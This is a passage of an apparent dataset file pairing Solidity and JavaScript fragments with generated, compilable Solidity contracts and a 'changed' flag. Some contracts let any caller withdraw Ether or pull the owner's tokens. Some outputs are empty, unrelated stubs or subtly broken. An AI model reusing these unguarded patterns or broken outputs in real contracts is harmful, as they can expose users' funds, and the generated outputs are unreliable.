        "output": "pragma solidity ^0.8.9;\ninterface IUniswapV2Router02 {\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    \n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ncontract MyContract {\n    IUniswapV2Router02 public uniswapV2Router;\n    address public myToken = address(this);\n\n    constructor(address _uniswapV2Router) public {\n        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);\n    }\n\n    function addLiquidity(uint tokenAmount, uint ethAmount) public payable {\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\n            myToken,\n            tokenAmount,\n            0, \n            0, \n            address(this),\n            block.timestamp\n        );\n    }\n\n    function swapTokensForEth(uint tokenAmount, address[] memory path) public {\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0, \n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}\n\n",
        "changed": 0
    },
    "926.sol": {
        "input": "constructor(){\n  manager = msg.sender;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    // Define variable manager of type address\n    address public manager;\n\n    // Constructor function\n    constructor() public {\n        // Initialize manager with the address of the contract's creator.\n        manager = msg.sender;\n    }\n}\n\n",
        "changed": 0
    },
    "927.sol": {
        "input": "contract Target {\n  uint256 public lastCalledAtBlockNumber;\n\n  function foo() external {\n    lastCalledAtBlockNumber = block.number;\n  }\n}\n\nbytes32 blockHash = blockhash(block.number);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Target {\n    uint256 public lastCalledAtBlockNumber;\n    bytes32 public lastBlockHash;\n\n    function foo() external {\n        lastCalledAtBlockNumber = block.number;\n        lastBlockHash = blockhash(block.number - 1); // we have to use block.number - 1 because blockhash of the current block is not available\n    }\n}\n\n",
        "changed": 0
    },
    "928.sol": {
        "input": "contractInstance.testFunction(<any function args>, { value: ethers.utils.parseUnits(\"1\", \"ether\") });\n\nfunction testFunction() public payable {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestContract {\n    \n    function testFunction() public payable {\n        // Function implementation here\n    }\n\n    function callTestFunction() public payable {\n        // Assume contractInstance is an instance of TestContract\n        TestContract contractInstance = TestContract(address(this));\n        contractInstance.testFunction{ value: 1 ether }();\n    }\n}\n\n",
        "changed": 0
    },
    "929.sol": {
        "input": "pragma solidity >=0.7.0<0.9.0;\n\ncontract Withdraw {\n    constructor() payable {}\n\n    function withdrawByTransfer(uint256 amount) public payable {\n        payable(msg.sender).transfer(amount);\n    }\n\n    function withdrawBySend(uint256 amount) public payable {\n        bool success = payable(msg.sender).send(amount);\n        require(success, \"Failed to send Ether\");\n    }\n\n    function withdrawByCall(uint256 amount) public returns(bytes memory) {\n        (bool success, bytes memory result) = payable(msg.sender).call{value: amount}(\"\");\n        require(success, \"Failed to withdraw Ether\");\n\n        return result;\n    }\n}\n\n\n",
        "output": "//SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.7.0<0.9.0;\n\ncontract Withdraw {\n    constructor() payable {}\n\n    function withdrawByTransfer(uint256 amount) public payable {\n        payable(msg.sender).transfer(amount);\n    }\n\n    function withdrawBySend(uint256 amount) public payable {\n        bool success = payable(msg.sender).send(amount);\n        require(success, \"Failed to send Ether\");\n    }\n\n    function withdrawByCall(uint256 amount) public returns(bytes memory) {\n        (bool success, bytes memory result) = payable(msg.sender).call{value: amount}(\"\");\n        require(success, \"Failed to withdraw Ether\");\n\n        return result;\n    }\n}\n\n",
        "changed": 0
    },
    "930.sol": {
        "input": "function getCardsByOwner(address user) external view returns(uint[] memory _cards) {\n    uint[] memory result = new uint[](userToCardsCount[user]);\n    uint counter = 0;\n    for (uint i = 0; i < cards.length; i++) {\n        if (cardIdToUser[i] == user) {\n            result[counter] = cards[i];\n            counter++;\n        }\n    }\n    return result;\n}\n\nconst getCards = async () => {\n    if (typeof window.ethereum !== 'undefined'){\n        const provider = new ethers.providers.Web3Provider(window.ethereum) \n        const signer = provider.getSigner()\n        const contract = new ethers.Contract(cardsAddress, Cards.abi, signer)\n        try {\n            const data = await contract.getCardsByOwner(signer.getAddress())\n            console.log(await contract.getOwnCards())\n            console.log(data)\n        } catch (error) {\n            console.log(error)\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract CardsContract {\n  address[] public cards;\n  mapping(address => uint) public userToCardsCount;\n  mapping(uint => address) public cardIdToUser;\n\n  function addCard(address _card) public {\n    userToCardsCount[msg.sender]++;\n    cardIdToUser[cards.length] = msg.sender;\n    cards.push(_card);\n  }\n\n  function getCardsByOwner(address _user) external view returns(uint[] memory) {\n    uint[] memory result = new uint[](userToCardsCount[_user]);\n    uint counter = 0;\n    for (uint i = 0; i < cards.length; i++) {\n      if (cardIdToUser[i] == _user) {\n        result[counter] = i;\n        counter++;\n      }\n    }\n    return result;\n  }\n}\n\n",
        "changed": 0
    },
    "931.sol": {
        "input": "modifier ownerOnly{\n        require(msg.sender == owner,\"Invalid caller\");\n        _;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier ownerOnly {\n        require(msg.sender == owner,\"Invalid caller\");\n        _;\n    }\n\n    function changeOwner(address newOwner) public ownerOnly {\n        require(newOwner != address(0), \"Invalid new owner address\");\n        owner = newOwner;\n    }\n}\n\n",
        "changed": 0
    },
    "932.sol": {
        "input": "    function mint(address _to, uint256 _quantity) \n        external  \n        payable\n        isCorrectPayment(_quantity)\n        isAvailable(_quantity) \n    {\n        mintInternal(_to, _quantity);\n    }\n\n    function mintInternal(address _to, uint256 _quantity) internal {\n        for (uint256 i = 0; i < _quantity; i++) {\n            uint256 tokenId = nextId.current();\n            nextId.increment();\n\n            _safeMint(_to, tokenId);\n\n            emit Mint(tokenId);\n        }\n    } \n\n    modifier isCorrectPayment(uint256 _quantity) {\n        require(msg.value == (price * _quantity), \"Incorrect Payment Sent\");\n        _;\n    }\n\n    modifier isAvailable(uint256 _quantity) {\n        require(nextId.current() + _quantity <= MAX_SUPPLY, \"Not enough tokens left for quantity\");\n        _;\n    }\n\n    <CrossmintPayButton\n        clientId=\"_YOUR_CROSSMINT_CLIENT_ID_\"\n        environment=\"staging\"\n        mintConfig={{\n            totalPrice: \"0.001\",\n            _quantity: \"1\"\n    }}\n    />\n\n\n",
        "output": "",
        "changed": 0
    },
    "933.sol": {
        "input": "pragma solidity ^0.8.15;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\nimport \"./Energy.sol\";\nimport \"./Fuel.sol\";\n\n\ncontract Generator is Ownable, ReentrancyGuard, ERC721Holder {\nFuel fuel;\nEnergy energy;\n\nstruct Loader {\nuint256[] fuelIds;\nmapping(uint256 => uint256) loadBlock;\n}\n\nuint256 rewardsPerBlock = 5;\n\nmapping(address => Loader) loaders;\n\nmapping(address => mapping(uint256 => uint256)) public fuelIdIndex;\n\nmapping(uint256 => address) public loaderOf;\n\nconstructor(address _fuel, address _energy) {\n    fuel = Fuel(_fuel);\n    energy = Energy(_energy);\n}\n\nfunction stake(uint256 fuelId) public nonReentrant {\n    require(\n        fuel.ownerOf(fuelId) == msg.sender,\n        \"You're not the owner of this NFT\"\n    );\n\n    loaders[msg.sender].fuelIds.push(fuelId);\n\n    uint256 totalFuel = loaders[msg.sender].fuelIds.length;\n    fuelIdIndex[msg.sender][fuelId] = totalFuel - 1;\n\n    loaders[msg.sender].loadBlock[fuelId] = block.number;\n\n    loaderOf[fuelId] = msg.sender;\n\n    fuel.safeTransferFrom(address(msg.sender), address(this), fuelId);\n}\n\nfunction unstake(uint256 fuelId) public nonReentrant {\n    require(msg.sender == loaderOf[fuelId], \"You are not the owner\"); \n\n\n    uint256 lastFuelIndex = loaders[msg.sender].fuelIds.length - 1;\n    uint256 fuelIndex = fuelIdIndex[msg.sender][fuelId];\n\n    if (lastFuelIndex != fuelIndex) {\n        uint256 lastFuelId = loaders[msg.sender].fuelIds[lastFuelIndex];\n\n        loaders[msg.sender].fuelIds[fuelIndex] = lastFuelIndex; \n last token to the slot of the to-delete token\n        fuelIdIndex[msg.sender][lastFuelId] = fuelIndex; \n moved token's index\n    }\n\n    delete fuelIdIndex[msg.sender][fuelId];\n    delete loaders[msg.sender].fuelIds[lastFuelIndex];\n\n    delete loaders[msg.sender].loadBlock[fuelId];\n    \n\n    fuel.safeTransferFrom(address(this), address(msg.sender), fuelId);\n    claim(fuelId);\n}\n\nfunction claim(uint256 fuelId) public {\n    require(msg.sender == loaderOf[fuelId], \"You are not the owner\");\n\n\n    uint256 rewardsToClaim = getPendingRewards(msg.sender, fuelId);\n    energy.mintRewards(msg.sender, rewardsToClaim);\n\n    loaders[msg.sender].loadBlock[fuelId] = block.number;\n    delete loaderOf[fuelId];\n}\n\nfunction claimAll() public nonReentrant {\n    require(\n        loaders[msg.sender].fuelIds.length > 0,\n        \"You have no fuel loaded here!\"\n    );\n\n    uint256 totalFuelLoaded = totalFuelLoadedBy(msg.sender);\n\n    for (uint256 i = 0; i < totalFuelLoaded; i++) {\n        uint256 fuelId = loaders[msg.sender].fuelIds[i];\n        claim(fuelId);\n    }\n}\n\nfunction getPendingRewards(address account, uint256 fuelId) public view \nreturns (uint256) {\n\n    uint256 loadBlock = loaders[account].loadBlock[fuelId];\n    uint256 blocksElapsed = block.number - loadBlock;\n\n    return blocksElapsed * rewardsPerBlock;\n}\n\nfunction getAllPendingRewards() public view returns (uint256) {\n    uint256 totalFuelLoaded = totalFuelLoadedBy(msg.sender);\n\n    uint256 totalRewards = 0;\n    for (uint256 i = 0; i < totalFuelLoaded; i++) {\n        uint256 fuelId = loaders[msg.sender].fuelIds[i];\n        totalRewards += getPendingRewards(msg.sender, fuelId);\n    }\n\n    return totalRewards;\n}\n\nfunction _loaderOf(uint256 fuelId) public view returns (address) {\n    return loaderOf[fuelId];\n}\n\nfunction totalFuelLoadedBy(address account) public view returns (uint256) {\n    return loaders[account].fuelIds.length;\n}\n\nfunction generatorAddress() public view returns (address) {\n    return address(this);\n}\n\n\nfunction onERC721Received(address, address, uint256, bytes memory) public \nvirtual override returns (bytes4) {\n    return this.onERC721Received.selector;\n}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Energy {\n    function mintRewards(address account, uint256 amount) public {\n        // Logic to mint Energy\n    }\n}\n\n",
        "changed": 1
    },
    "934.sol": {
        "input": "pragma solidity 0.8.7;\ncontract MyContract{\n    bytes8 [] Names;\n    \n    function setName(string memory _name) public{\n        bytes8 newName=bytes8(bytes(_name));\n        Names.push(newName);\n    }\n}\n\nfunction setName(bytes8 _name) public{\n        Names.push(_name);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    bytes8[] public Names;\n    \n    function setName(string memory _name) public {\n        bytes8 newName = bytes8(bytes(_name));\n        Names.push(newName);\n    }\n\n    function setName(bytes8 _name) public {\n        Names.push(_name);\n    }\n}\n\n",
        "changed": 0
    },
    "935.sol": {
        "input": "function funFind() public view returns(uint) {\n    uint temp;\n    for(uint i = 0; i < arr.length; i++) {\n        temp = arr[i];\n        for(uint j = 0; j < arr.length; j++) {\n            if((j != i) && (temp == arr[j])) {\n                return temp;\n            }\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DuplicateFinder {\n    uint[] public arr;\n\n    constructor(uint[] memory initialArray) public {\n        arr = initialArray;\n    }\n\n    function funFind() public view returns(uint) {\n        uint temp;\n        for(uint i = 0; i < arr.length; i++) {\n            temp = arr[i];\n            for(uint j = 0; j < arr.length; j++) {\n                if((j != i) && (temp == arr[j])) {\n                    return temp;\n                }\n            }\n        }\n        return 0;\n    }\n}\n\n",
        "changed": 0
    },
    "936.sol": {
        "input": "constituencyRegister.push(c);\n\npragma solidity ^0.8.0;\n\ncontract MuC {\n    struct voter{\n        string name;\n        address constituency;\n        uint age;\n        bool isVoted;\n    }\n\n    struct constituency{\n        string name;\n        voter[] candidates;\n    }\n\n    constituency[] public constituencyRegister;\n    function addConstituency(string memory _name,voter[] memory _candidates)\n        public\n    {\n        constituency storage c = constituencyRegister.push();\n        c.name = _name;\n        for(uint i = 0; i < _candidates.length; i++) {\n            c.candidates.push(_candidates[i]);\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MuC {\n    struct Voter {\n        string name;\n        uint age;\n        bool isVoted;\n    }\n\n    struct Constituency {\n        string name;\n        Voter[] candidates;\n    }\n\n    mapping(string => Constituency) public constituencyRegister;\n\n    function addConstituency(string memory _name, Voter[] memory _candidates) public {\n        Constituency storage c = constituencyRegister[_name];\n        c.name = _name;\n        for(uint i = 0; i < _candidates.length; i++) {\n            c.candidates.push(_candidates[i]);\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "937.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    mapping(address => bool) public myMap;\n    \n    constructor() {\n        myMap[address(0x123)] = true;\n        myMap[address(0x456)] = false;\n        myMap[address(0x789)] = true;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    mapping(address => bool) public myMap;\n    \n    constructor() {\n        myMap[address(0x123)] = true;\n        myMap[address(0x456)] = false;\n        myMap[address(0x789)] = true;\n    }\n}\n\n",
        "changed": 0
    },
    "939.sol": {
        "input": "function payRequest(address payable _recipient, uint256 _amount)payable public {\n        \n        (bool success, bytes memory transactionBytes) = _recipient.call{value:_amount}('');\n        \n        emit TransactionBytes(transactionBytes);\n        \n        emit RequestPaid(msg.sender, _amount);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    event TransactionBytes(bytes transactionBytes);\n    event RequestPaid(address sender, uint256 amount);\n\n    function payRequest(address payable _recipient, uint256 _amount) public payable {\n        require(msg.value >= _amount, \"Not enough funds sent with transaction\");\n        \n        (bool success, bytes memory transactionBytes) = _recipient.call{value:_amount}('');\n\n        require(success, \"Transaction failed\");\n\n        emit TransactionBytes(transactionBytes);\n        emit RequestPaid(msg.sender, _amount);\n    }\n}\n\n",
        "changed": 0
    },
    "940.sol": {
        "input": "contract Users {\n    struct User {\n        string username;\n        uint[] grades;\n        address byWhom;\n        uint timestamp;\n    }\n    mapping(string => User) userMap;\n\n    event userDetailsChanged(\n        string username,\n        uint grade\n    );\n    function setUserDetails(string memory _username, uint _grade) external {\n        if(userMap[_username].grades.length==0){\n            User storage currentUser=userMap[_username];\n            currentUser.grades.push(_grade);\n            return;\n        } \n        userMap[_username].username = _username;\n        userMap[_username].grades.push(_grade);\n        userMap[_username].byWhom=msg.sender;\n        userMap[_username].timestamp=block.timestamp;\n        \n\n        emit userDetailsChanged(_username, _grade);\n    }\n\n    function getUserGrades(string memory _username) external view returns(uint[] memory _grades) {\n        return (\n            userMap[_username].grades\n        );\n    }\n}\n\n\n",
        "output": "contract Users {\n    struct User {\n        string username;\n        uint[] grades;\n        address byWhom;\n        uint timestamp;\n    }\n    mapping(string => User) userMap;\n\n    event userDetailsChanged(\n        string username,\n        uint grade\n    );\n    function setUserDetails(string memory _username, uint _grade) external {\n        // if _username exists add your logic \n        // i cannot just write this: userMap[_username]. it cannot be convertible bool because if it does not exists, evm will return struct with default values\n        if(userMap[_username].grades.length==0){\n            User storage currentUser=userMap[_username];\n            currentUser.grades.push(_grade);\n            return;\n        } \n        userMap[_username].username = _username;\n        userMap[_username].grades.push(_grade);\n        // you might need to add restriction rule to allow certain people to call this function.\n        // msg.sender is the caller of this function\n        userMap[_username].byWhom=msg.sender;\n        userMap[_username].timestamp=block.timestamp;\n        \n\n        // YOU COULD ALSO DO THIS \n        // userMap[_username]=User(\n        //     _username,\n        //     _grade,\n        //     msg.sender,\n        //     block.timestamp\n        // )\n        emit userDetailsChanged(_username, _grade);\n    }\n\n    function getUserGrades(string memory _username) external view returns(uint[] memory _grades) {\n        return (\n            userMap[_username].grades\n        );\n    }\n}\n\n",
        "changed": 0
    },
    "941.sol": {
        "input": "  function addFunds(\n    uint256 id,\n    uint96 amount\n  )\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FundContract {\n    struct Fund {\n        uint256 id;\n        uint96 amount;\n    }\n\n    mapping(uint256 => Fund) public funds;\n\n    function addFunds(uint256 id, uint96 amount) public {\n        Fund storage fund = funds[id];\n        fund.id = id;\n        fund.amount += amount;\n    }\n\n    function getFund(uint256 id) public view returns (uint256, uint96) {\n        Fund storage fund = funds[id];\n        return (fund.id, fund.amount);\n    }\n}\n\n",
        "changed": 1
    },
    "944.sol": {
        "input": "function getBikes() public view returns (Bike[] memory){\n    return bikes;\n}\n\nfunction changeAvailability() public {\n    bikes[1].isAvailable=false;\n}\n\nconst ABI = [\"function greet() public view returns (string)\"]\nconst contract = new ethers.Contract(contractAddress, ABI, provider);\n\nconst ABI = [\n\"function setGreeting(string _greeting) public\",\n\"function deposit() public payable\"\n]\nconst contract = new ethers.Contract(contractAddress, ABI, signer)\n\nimport React, {useState, useEffect} from 'react'\nconst { ethers } = require(\"ethers\");\n\nfunction App1() {\n  const [greet, setGreet] = useState('')\n  const [balance, setBalance] = useState(0)\n  const [depositValue, setDepositValue] = useState('')\n  const [greetingValue, setGreetingValue] = useState('')\n  const [isWalletConnected, setIsWalletConnected] = useState(false)\n  const contractAddress = \"0x5FbDB2315678afecb367f032d93F642f64180aa3\"\n  const ABI = [\n    \"function greet() public view returns (string)\",\n    \"function setGreeting(string _greeting) public\",\n    \"function deposit() public payable\"\n  ]\n\n  const checkIfWalletIsConnected = async () => {\n    try {\n      if (window.ethereum) {\n        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })\n        const account = accounts[0];\n        setIsWalletConnected(true);\n        console.log(\"Account Connected: \", account);\n      } else {\n        console.log(\"No Metamask detected\");\n      }\n    } catch (error) {\n      console.log(error);\n    }\n  }\n\n  const getBalance = async () => {\n    try{\n        if(window.ethereum){\n            const provider = new ethers.BrowserProvider(window.ethereum);\n\n            const balance = await provider.getBalance(contractAddress)\n            const balanceFormatted = ethers.formatEther(balance)\n            setBalance(balanceFormatted)\n        } else{\n            console.log(\"Ethereum object not found, install Metamask.\");\n        }\n    } catch (error) {\n        console.log(error)\n    }\n  }\n\n  const getGreeting = async () => {\n    try{\n        if(window.ethereum){\n            const provider = new ethers.BrowserProvider(window.ethereum);\n            const contract = new ethers.Contract(contractAddress, ABI, provider);\n\n            const greeting = await contract.greet()\n            setGreet(greeting)\n        } else{\n            console.log(\"Ethereum object not found, install Metamask.\");\n        }\n    } catch (error) {\n        console.log(error)\n    }\n  }\n\n  const handleGreetingChange = (e) => {\n    setGreetingValue(e.target.value)\n  }\n  \n  const handleGreetingSubmit = async (e) => {\n    try{\n        e.preventDefault()\n        if(window.ethereum){\n            const provider = new ethers.BrowserProvider(window.ethereum);\n            const signer = await provider.getSigner();\n            const contract = new ethers.Contract(contractAddress, ABI, signer);\n\n            const greetingUpdate = await contract.setGreeting(greetingValue)\n            await greetingUpdate.wait()\n            setGreet(greetingValue)\n            setGreetingValue('')\n        } else {\n            console.log(\"Ethereum object not found, install Metamask.\");\n        }\n    } catch (error) {\n        console.log(error)\n    }\n  } \n\n  const handleDepositchange = (e) => {\n    setDepositValue(e.target.value)\n  }\n\n  const handleDepositSubmit = async (e) => {\n    try{\n        e.preventDefault()\n        if(window.ethereum){\n            const provider = new ethers.BrowserProvider(window.ethereum);\n            const signer = await provider.getSigner();\n            const contract = new ethers.Contract(contractAddress, ABI, signer);\n\n            const ethValue = ethers.parseEther(depositValue)\n            const depositEth = await contract.deposit({value: ethValue})\n            await depositEth.wait()\n            const balance = await provider.getBalance(contractAddress)\n            const balanceFormatted = ethers.formatEther(balance)\n            setBalance(balanceFormatted)\n        } else {\n            console.log(\"Ethereum object not found, install Metamask.\");\n        }\n    } catch (error) {\n        console.log(error)\n    }\n  }\n\n  useEffect(() => {\n    checkIfWalletIsConnected();\n    getBalance();\n    getGreeting()\n  }, [isWalletConnected])\n\n\n  return (\n    <div className=\"container\">\n      <div className=\"container\">\n        <div className=\"row mt-5\">\n          <div className=\"col\">\n            <h3>{greet}</h3>\n            <p>Contract balance: {balance} ETH</p>\n          </div>\n          <div className=\"col\">\n            <form onSubmit={handleDepositSubmit}>\n              <div className=\"mb-3\">\n                <input type=\"number\" className=\"form-control\" placeholder=\"0\" onChange = {handleDepositchange} value={depositValue}/>\n              </div>\n              <button type=\"submit\" className=\"btn btn-success\">Deposit</button>\n            </form>\n            <form className=\"mt-5\" onSubmit={handleGreetingSubmit}>\n              <div className=\"mb-3\">\n                <input type=\"text\" className=\"form-control\" onChange={handleGreetingChange} value={greetingValue}/>\n              </div>\n              <button type=\"submit\" className=\"btn btn-dark\">Change</button>\n            </form>\n          </div>\n        </div>\n      </div>\n    </div>\n  );\n}\n\nexport default App1;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BikeContract {\n    struct Bike {\n        bool isAvailable;\n        uint256 price;\n    }\n    \n    Bike[] public bikes;\n\n    constructor() public {\n        bikes.push(Bike(true, 100));\n        bikes.push(Bike(true, 200));\n    }\n    \n    function getBikes() public view returns (Bike[] memory){\n        return bikes;\n    }\n\n    function changeAvailability() public {\n        bikes[1].isAvailable = false;\n    }\n}\n\n",
        "changed": 0
    },
    "945.sol": {
        "input": "pragma solidity ^0.8;\n\ninterface IERC20 {\n    function transferFrom(address, address, uint256) external returns (bool);\n}\n\ncontract WDfromContractOwner {\n    address public owner;\n\n    function withdrawToken() external {\n        address mainnetUSDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n        address receiver = msg.sender; \n        uint256 amount = 5 * 1e6; \n        require(\n            IERC20(mainnetUSDT).transferFrom(owner, receiver, amount)\n        );\n    }\n}\n\nconst USDTAddress = \"0xdAC17F958D2ee523a2206206994597C13D831ec7\";\nconst ownerAddress = \"0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF\";\n\nconst ABI = [\n    {\"constant\":true,\"inputs\":[{\"name\":\"who\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}\n];\n\nconst USDTContract = new web3.eth.Contract(ABI, USDTAddress);\nconst approved = await USDTContract.methods.balanceOf(ownerAddress).call();\nconsole.log(approved);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract WDfromContractOwner {\n    IERC20 public token;\n    address public owner;\n\n    constructor(address tokenAddress, address _owner) {\n        token = IERC20(tokenAddress);\n        owner = _owner;\n    }\n\n    function withdrawToken() external {\n        address receiver = msg.sender; \n        uint256 amount = 5 * 1e6; \n        require(token.transferFrom(owner, receiver, amount), \"Transfer failed\");\n    }\n}\n\n",
        "changed": 0
    },
    "946.sol": {
        "input": "_owners[0] = '0x11'\n_owners[1] = '0x22'\n_owners[2] = '0x33'\n_owners[3] = '0x44'\n\ntotalSupply = 4\n\ndelete _owners[2]\ntotal -= 1\n\nfor (uint256 i; i < total; i++) {\n   tokenIds[i] = ownerOf(i);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract {\n    mapping(uint => address) public _owners;\n    mapping(uint => uint256) public tokenIds;\n    uint256 public totalSupply;\n\n    constructor() {\n        _owners[0] = 0x11;\n        _owners[1] = 0x22;\n        _owners[2] = 0x33;\n        _owners[3] = 0x44;\n\n        totalSupply = 4;\n\n        delete _owners[2];\n        totalSupply -= 1;\n\n        for (uint256 i; i < totalSupply; i++) {\n            tokenIds[i] = uint256(uint160(_owners[i]));\n        }\n    }\n\n    function ownerOf(uint256 tokenId) public view returns (address) {\n        return _owners[tokenId];\n    }\n}\n\n",
        "changed": 0
    },
    "947.sol": {
        "input": "import \"./ERC721Connector.sol\"; \n\n\n",
        "output": "",
        "changed": 0
    },
    "948.sol": {
        "input": "(bool success, bytes memory returnData) = to.call.value(value)(abi.encodePacked(data, from));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ExampleContract {\n    event Transfer(address indexed from, address indexed to, uint256 value, bytes data);\n\n    function transfer(address payable to, uint256 value, bytes memory data, address from) public payable {\n        require(msg.value >= value, \"Insufficient Ether sent to the contract\");\n\n        (bool success, bytes memory returnData) = to.call{value: value}(abi.encodePacked(data, from));\n        require(success, \"Transfer failed\");\n\n        emit Transfer(from, to, value, data);\n    }\n}\n\n",
        "changed": 1
    },
    "949.sol": {
        "input": "    event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);\n\nconst txResponse = await myNFT.mintNFT(deployer.address, newMintItem.uri);\n\nconst txReceipt = await txResponse.wait();\n\nconst [transferEvent] = txReceipt.events;\n\nconst { tokenId } = transferEvent.args;\n\ndescribe('Receiving a value returned by a transacting function', () => {\n    it('Should return a correct ID of the newly minted item', async () => {\n      const newMintItem = {\n        id: 1,\n        uri: 'ipfs:\n      };\n      const txResponse = await myNFT.mintNFT(deployer.address, newMintItem.uri);\n      const txReceipt = await txResponse.wait();\n      const [transferEvent] = txReceipt.events;\n      const { tokenId } = transferEvent.args;\n      expect(tokenId).to.equal(newMintItem.id);\n    });\n  });\n\n\n",
        "output": "",
        "changed": 0
    },
    "950.sol": {
        "input": " (bool success, bytes memory data) = payable(_to).call{value: _amount}(\"\");\n\ncompilers: {\n    solc: {\n      version: \"0.8.4\",\n    }\n  }\n\npragma solidity >=0.4.22 <0.9.0;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TransferContract {\n    function transferFund(address _to, uint _amount) public payable returns(bool, bytes memory) {\n        require(msg.value >= _amount, \"Not enough funds sent\");\n        (bool success, bytes memory data) = payable(_to).call{value: _amount}(\"\");\n        require(success, \"Transfer failed.\");\n        return (success, data);\n    }\n}\n\n",
        "changed": 1
    },
    "951.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        address to = payable(address(0x0));\n        bytes memory sendData = new bytes(12); \n        to.call{value: 1000000000000, gas: 163502}(sendData);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        address to = payable(address(0x0));\n        bytes memory sendData = new bytes(12); // empty 12 byte array\n        to.call{value: 1000000000000, gas: 163502}(sendData);\n    }\n}\n\n",
        "changed": 0
    },
    "952.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    mapping (address => uint256) contributions;\n\n    receive() external payable {\n        contributions[msg.sender] += msg.value;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    mapping (address => uint256) contributions;\n\n    receive() external payable {\n        contributions[msg.sender] += msg.value;\n    }\n}\n\n",
        "changed": 0
    },
    "953.sol": {
        "input": "let result = web3.eth.abi.decodeLog([{\n    type: 'string',\n    name: 'tokenTicker',\n    indexed: true\n    }],\n    data,\n    topics[1]);\n\nevent BridgeAdded(\n        uint256 indexed id,\n        string tokenTicker,\n        string tokenName,\n        string imageUrl\n    );\n\nevent BridgeAdded(\n            string indexed indexedTokenTicker,\n            string tokenTicker,\n            string tokenName,\n            string imageUrl\n        );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BridgeContract {\n    struct Bridge {\n        uint256 id;\n        string tokenTicker;\n        string tokenName;\n        string imageUrl;\n    }\n\n    mapping(uint256 => Bridge) public bridges;\n    uint256 public bridgeCount;\n\n    event BridgeAdded(\n        uint256 indexed id,\n        string tokenTicker,\n        string tokenName,\n        string imageUrl\n    );\n\n    event BridgeModified(\n        string indexed indexedTokenTicker,\n        string tokenTicker,\n        string tokenName,\n        string imageUrl\n    );\n\n    function addBridge(string memory _tokenTicker, string memory _tokenName, string memory _imageUrl) public {\n        bridgeCount++;\n        bridges[bridgeCount] = Bridge(bridgeCount, _tokenTicker, _tokenName, _imageUrl);\n        emit BridgeAdded(bridgeCount, _tokenTicker, _tokenName, _imageUrl);\n    }\n\n    function modifyBridge(uint256 _id, string memory _tokenTicker, string memory _tokenName, string memory _imageUrl) public {\n        Bridge storage bridge = bridges[_id];\n        bridge.tokenTicker = _tokenTicker;\n        bridge.tokenName = _tokenName;\n        bridge.imageUrl = _imageUrl;\n        emit BridgeModified(_tokenTicker, _tokenTicker, _tokenName, _imageUrl);\n    }\n}\n\n",
        "changed": 0
    },
    "954.sol": {
        "input": "const provider = new ethers.providers.Web3Provider(window.ethereum, \"any\");\nawait provider.send(\"eth_requestAccounts\", []);\nconst signer = provider.getSigner();\n\nconst abi = [\"function associate()\"];\n\nconst tokenSolidityAddress = '0x' + TokenId.fromString('0.0.572609').tokenSolidityAddress();\n\n  const contract = new ethers.Contract(tokenSolidityAddress, abi, signer);\n\n  try {\n    const transactionResult = await contract.associate();\n    return transactionResult.hash;\n  } catch (error) {\n    console.warn(error.message ? error.message : error);\n    return null;\n  }\n\nasync function dissociateToken() {\n    const provider = new ethers.providers.Web3Provider(window.ethereum, \"any\");\n    await provider.send(\"eth_requestAccounts\", []);\n    const signer = provider.getSigner();\n    const abi = [\"function dissociate()\"];\n    const tokenSolidityAddress = '0x' + TokenId.fromString('0.0.572609').tokenSolidityAddress();\n    const contract = new ethers.Contract(tokenSolidityAddress, abi, signer);\n  \n    try {\n      const transactionResult = await contract.dissociate();\n      return 